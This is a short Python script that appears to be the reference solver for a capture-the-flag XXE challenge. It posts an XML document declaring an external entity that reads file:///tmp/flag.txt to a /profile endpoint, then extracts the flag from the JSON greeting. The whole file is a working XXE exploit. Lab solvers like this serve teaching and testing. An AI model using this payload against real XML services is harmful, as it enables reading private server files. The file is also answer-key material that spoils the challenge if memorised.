"""Reference solver for xxe: read /tmp/flag.txt via an external entity.

    python3 solve.py <host> <port>
"""
import json
import re
import sys
import urllib.request

PAYLOAD = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE user [ <!ENTITY xxe SYSTEM "file:///tmp/flag.txt"> ]>\n'
    '<user><name>&xxe;</name></user>'
)


def main():
    host, port = sys.argv[1], sys.argv[2]
    req = urllib.request.Request(f"http://{host}:{port}/profile",
                                 data=PAYLOAD.encode(),
                                 headers={"Content-Type": "application/xml"})
    data = json.loads(urllib.request.urlopen(req, timeout=15).read())
    g = data.get("greeting", "")
    m = re.search(r"flag\{[^}]*\}", g)
    print(m.group(0) if m else g)


if __name__ == "__main__":
    main()
